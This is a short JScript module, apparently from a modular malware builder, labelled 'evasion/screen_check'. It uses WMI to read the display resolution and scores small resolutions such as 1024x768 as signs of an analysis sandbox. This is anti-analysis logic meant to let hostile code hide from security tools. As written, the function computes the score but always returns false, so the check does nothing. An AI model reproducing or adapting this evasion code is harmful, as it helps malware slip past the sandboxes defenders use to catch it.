// chunk: evasion/screen_check
// depends: core/run_cmd
// provides: check_screen
// format: jscript
// note: WMI Win32_VideoController screen resolution check. Sandboxes often
//       use 1024x768 or smaller. Runs check for behavioral diversity.

function check_screen() {
    var score = 0;
    try {
        var loc = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc = loc.ConnectServer(".", "root\\cimv2");
        var vids = svc.ExecQuery("SELECT CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoController");
        var en = new Enumerator(vids);
        if (!en.atEnd()) {
            var item = en.item();
            var hRes = parseInt(item.CurrentHorizontalResolution) || 0;
            var vRes = parseInt(item.CurrentVerticalResolution) || 0;
            if (hRes < 1280 || vRes < 720) score++;
            if (hRes === 1024 && vRes === 768) score++;
        }
    } catch(e) {}
    return false;
}
